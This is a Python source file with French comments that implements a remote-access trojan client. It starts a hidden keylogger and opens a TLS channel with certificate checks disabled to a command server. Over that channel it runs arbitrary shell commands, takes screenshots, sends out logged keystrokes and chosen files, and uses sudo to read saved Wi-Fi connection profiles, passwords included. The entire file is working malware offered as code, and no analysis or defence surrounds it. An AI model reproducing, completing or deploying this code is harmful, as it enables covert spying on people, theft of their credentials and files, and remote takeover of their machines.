import socket, ssl, time, subprocess, os, sys, struct, paramiko, threading, pyautogui, cv2
from pynput import keyboard
from PIL import Image

# --- PARAMÈTRES RÉSEAU ---
CIBLE_IP = "127.0.0.1" 
CIBLE_PORT = 12345 

# --- VARIABLE GLOBALE KEYLOGGER ---
journal_touches = "" # Stocke les frappes en mémoire

def enregistreur_frappe(touche):
    """Capture chaque pression de touche et l'ajoute au journal"""
    global journal_touches
    try:
        journal_touches += str(touche.char) # Caractères alphanumériques
    except AttributeError:
        # Gestion des touches spéciales pour la lisibilité
        if str(touche) == "Key.space":
            journal_touches += " "
        elif str(touche) == "Key.enter":
            journal_touches += "\n"
        elif str(touche) == "Key.backspace":
            journal_touches += " [BS] "
        else:
            journal_touches += f" [{str(touche).replace('Key.', '')}] "

def demarrer_surveillance_clavier():
    """Lance l'écouteur de clavier en arrière-plan"""
    with keyboard.Listener(on_press=enregistreur_frappe) as auditeur:
        auditeur.join()

def initialisation_flux():
    """Gère la connexion sécurisée et la boucle d'écoute"""
    connexion_brute = None
    reglages = ssl.create_default_context()
    reglages.check_hostname = False
    reglages.verify_mode = ssl.CERT_NONE 

    try:
        connexion_brute = socket.create_connection((CIBLE_IP, CIBLE_PORT))
        canal_chiffre = reglages.wrap_socket(connexion_brute, server_hostname=CIBLE_IP) 
        
        while True:
            # Réception de l'ordre depuis le serveur Flask
            donnee_serveur = canal_chiffre.recv(4096).decode().strip().lower()
            if donnee_serveur in ["exit", "disconnect"]: 
                break
            
            # Appel du gestionnaire de tâches
            reponse_tache = executeur_de_requetes(donnee_serveur, canal_chiffre)
            
            if reponse_tache is not None:
                canal_chiffre.send(str(reponse_tache).encode()) 
    except Exception:
        pass
    finally:
        if connexion_brute:
            connexion_brute.close()

def executeur_de_requetes(instruction, lien_socket):
    """Routeur de commandes vers les fonctions spécifiques"""
    global journal_touches
    
    if instruction == "get_ip":
        return subprocess.check_output("hostname -I", shell=True).decode().strip()
    
    elif instruction == "wifi":
        return recuperer_configs_reseau() 
    
    elif instruction == "screenshot":
        return generer_instante_ecran() 
    
    elif instruction == "get_keys":
        # Récupère le contenu du keylogger et vide la mémoire locale
        extraction = journal_touches
        journal_touches = "" 
        return extraction if extraction != "" else "Aucune frappe enregistrée."
    
    elif instruction.startswith("download "):
        fichiers = instruction.split(" ", 1)[1].split(";")
        envoi_flux_binaire(fichiers, lien_socket) 
        return None
    
    else:
        return commande_shell_directe(instruction) 

def commande_shell_directe(cmd_text):
    """Exécute une commande système standard"""
    try:
        processus = subprocess.run(cmd_text, shell=True, capture_output=True, text=True)
        return processus.stdout + processus.stderr 
    except Exception:
        return "Erreur système"

def generer_instante_ecran():
    """Effectue une capture d'écran via pyautogui"""
    try:
        img = pyautogui.screenshot().convert("RGB")
        img.save("temp_view.jpg", "JPEG") 
        return "Capture effectuée (temp_view.jpg)"
    except Exception:
        return "Échec capture (vérifiez la variable DISPLAY)"

def envoi_flux_binaire(liste_p, sock):
    """Transfère des fichiers octet par octet vers le serveur"""
    for p in liste_p:
        if os.path.exists(p):
            n_f = os.path.basename(p)
            t_f = os.path.getsize(p)
            sock.send(struct.pack("!I", len(n_f))) 
            sock.send(n_f.encode())
            sock.send(struct.pack("!Q", t_f)) 
            with open(p, "rb") as f_obj:
                while morceau := f_obj.read(4096):
                    sock.sendall(morceau) 
    sock.send(struct.pack("!I", len("[SYNC]")))
    sock.send("[SYNC]".encode())

def recuperer_configs_reseau():
    """Extrait les profils de connexion NetworkManager (root requis)"""
    try:
        dossier_nm = "/etc/NetworkManager/system-connections/" 
        resultats = []
        for element in os.listdir(dossier_nm):
            output = subprocess.run(["sudo", "cat", os.path.join(dossier_nm, element)], capture_output=True, text=True)
            if output.returncode == 0:
                resultats.append(output.stdout)
        with open("logs_wifi.txt", "w") as f_log:
            f_log.write("\n".join(resultats))
        return "Données Wi-Fi extraites dans logs_wifi.txt" 
    except Exception:
        return "Erreur d'accès aux fichiers réseaux"

if __name__ == "__main__":
    # Démarrage du thread Keylogger pour une capture continue
    threading.Thread(target=demarrer_surveillance_clavier, daemon=True).start()
    # Démarrage de la boucle de communication
    initialisation_flux()
